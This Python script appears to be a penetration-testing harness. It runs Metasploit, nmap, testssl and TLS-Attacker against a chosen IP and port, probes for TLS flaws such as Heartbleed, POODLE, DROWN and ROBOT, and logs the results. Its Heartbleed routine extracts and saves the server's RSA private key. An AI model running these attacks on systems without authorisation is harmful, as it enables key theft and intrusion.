import os
import logging
from datetime import datetime
import subprocess
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

COLOR = {
    "HEADER": Fore.MAGENTA,
    "BLUE": Fore.BLUE,
    "GREEN": Fore.GREEN,
    "RED": Fore.RED,
    "YELLOW": Fore.YELLOW,
    "CYAN": Fore.CYAN,
    "ENDC": Style.RESET_ALL,
}


def write_file(ip, port, stdout, attack):
    current_time = datetime.now().strftime("%H:%M:%S")
    header = f'---------START {attack}---------\nWrite at: {current_time}\n\n'
    footer = f'\n---------END {attack}---------\n\n'
    src_path = f"./Logs/{ip}_{port}"
    os.makedirs(src_path, exist_ok=True)
    try:
        with open(f'{src_path}/{attack}.log', 'a') as fp:
            fp.write(header)
            fp.write(stdout)
            fp.write(footer)
        logging.info(f"{COLOR['BLUE']}Result {attack} on {ip}:{port} written to file{COLOR['ENDC']}")
    except (SystemExit, KeyboardInterrupt):
        logging.info("Finished writing file")


def run_subprocess(command_list, ip, port, attack):
    try:
        process = subprocess.Popen(command_list, stdout=subprocess.PIPE)
        stdout, _ = process.communicate()
        stdout = stdout.decode()
        write_file(ip, port, stdout, attack)
    except (SystemExit, KeyboardInterrupt):
        logging.info(f"Interrupted {attack} Process due to KeyboardInterrupt")


# Attack Functions

def metasploit_process(ip, port, tls_version):
    command = (
        f"use auxiliary/scanner/ssl/openssl_heartbleed;"
        f"set RHOST {ip};"
        f"set RPORT {port};"
        f"set TLS_VERSION {tls_version};"
        "check;exit"
    )
    try:
        metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
        stdout = metasploit.communicate()[0].decode()
        result = stdout.partition("-")[2].strip()
        if 'The target appears to be vulnerable.' in result:
            command_key = (
                f"use auxiliary/scanner/ssl/openssl_heartbleed;"
                f"set RHOST {ip};"
                f"set RPORT {port};"
                f"set TLS_VERSION {tls_version};"
                "keys;exit"
            )
            metasploit_key = subprocess.Popen(['msfconsole', '-x', command_key], stdout=subprocess.PIPE)
            keyout = metasploit_key.communicate()[0].decode()
            if '-----BEGIN RSA PRIVATE KEY-----' in keyout:
                write_file(ip, port, keyout, 'PRIVATE KEY RETRIEVED BY METASPLOIT')
                logging.info(f'The {ip}:{port} is vulnerable to Heartbleed. Private key retrieved.')
        write_file(ip, port, result, 'HEARTBLEED BY METASPLOIT')
    except (SystemExit, KeyboardInterrupt):
        logging.info("Interrupted Metasploit Process due to KeyboardInterrupt")


def nmap_process(ip, port):
    command_list = ['timeout', '120', 'nmap', '-A', '-p', port, '--script=ssl-heartbleed.nse', ip]
    run_subprocess(command_list, ip, port, 'HEARTBLEED BY NMAP')


def testssl_heartbleed_process(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--heartbleed',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'HEARTBLEED BY TESTSSL')


def heartbleed_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    command_list = [
        'timeout', '80', 'java', '-jar', path, 'heartbleed', '-connect', host
    ]
    run_subprocess(command_list, ip, port, 'HEARTBLEED TLS-ATTACKER')


def crime_process(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--crime',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'CRIME')


def padding_attack_process_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    command_list = [
        'timeout', '80', 'java', '-jar', path, 'padding_oracle', '-connect', host
    ]
    run_subprocess(command_list, ip, port, 'Padding Oracle Attack')


def poodle_nmap_process(ip, port):
    command_list = ['nmap', '-A', '-p', port, '--script=ssl-poodle', ip]
    run_subprocess(command_list, ip, port, 'POODLE BY NMAP')


def poodle_testssl(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--poodle',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'POODLE TESTSSL')


def poodle_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    command_list = [
        'timeout', '80', 'java', '-jar', path, 'poodle', '-connect', host
    ]
    run_subprocess(command_list, ip, port, 'POODLE TLS-ATTACKER')


def lucky13_process(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--lucky13',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'LUCKY13')


def drown_attack(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--drown',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'DROWN BY TESTSSL')


def drown_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    command_list = [
        'timeout', '80', 'java', '-jar', path, 'generalDrown', '-connect', host
    ]
    run_subprocess(command_list, ip, port, 'DROWN TLS-ATTACKER')


def sweet32_process(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--sweet32',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'SWEET32')


def logjam_process(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--logjam',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'LOGJAM')


def logjam_process_nmap(ip, port):
    command_list = ['nmap', '-A', '-p', port, '--script=ssl-dh-params.nse', ip]
    run_subprocess(command_list, ip, port, 'LOGJAM BY NMAP')


def bleichenbachers_process(ip, port):
    path = "/home/kali/Desktop/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    command_list = [
        'timeout', '80', 'java', '-jar', path, 'bleichenbacher', '-connect', host
    ]
    run_subprocess(command_list, ip, port, 'BLEICHENBACHERS')


def robot_process(ip, port):
    host = f"{ip}:{port}"
    command_list = [
        'testssl',
        '--robot',
        '--color', '0',
        '--parallel',
        '--ssl-native',
        '--fast',
        '--warnings', 'off',
        host
    ]
    run_subprocess(command_list, ip, port, 'ROBOT')


def robot_metasploit(ip, port):
    command = f"use auxiliary/scanner/ssl/bleichenbacher_oracle;set RHOST {ip};set RPORT {port};exploit;exit"
    try:
        metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
        stdout = metasploit.communicate()[0].decode()
        result = stdout.partition('Starting persistent handler(s)...')[2]
        write_file(ip, port, result, 'BLEICHENBACHERS BY METASPLOIT')
    except (SystemExit, KeyboardInterrupt):
        logging.info("Interrupted Metasploit Process due to KeyboardInterrupt")


def roca_process(ip, port):
    command_list = ['nmap', '-A', '-p', port, '--script=rsa-vuln-roca', ip]
    run_subprocess(command_list, ip, port, 'ROCA Vulnerability')


def ticketbleed_process(ip, port):
    command_list = ['nmap', '-A', '-p', port, '--script=tls-ticketbleed', ip]
    run_subprocess(command_list, ip, port, 'TICKETBLEED BY NMAP')


def ccs_injection_process_nmap(ip, port):
    command_list = ['nmap', '-A', '-p', port, '--script=ssl-ccs-injection', ip]
    run_subprocess(command_list, ip, port, 'CCS Injection BY NMAP')


def ccs_injection_process_metasploit(ip, port):
    command = f"use auxiliary/scanner/ssl/openssl_ccs;set RHOST {ip};set RPORT {port};exploit;exit"
    try:
        metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
        stdout = metasploit.communicate()[0].decode()
        result = stdout.partition('Starting persistent handler(s)...')[2]
        write_file(ip, port, result, 'CCS Injection BY METASPLOIT')
    except (SystemExit, KeyboardInterrupt):
        logging.info("Interrupted Metasploit Process due to KeyboardInterrupt")
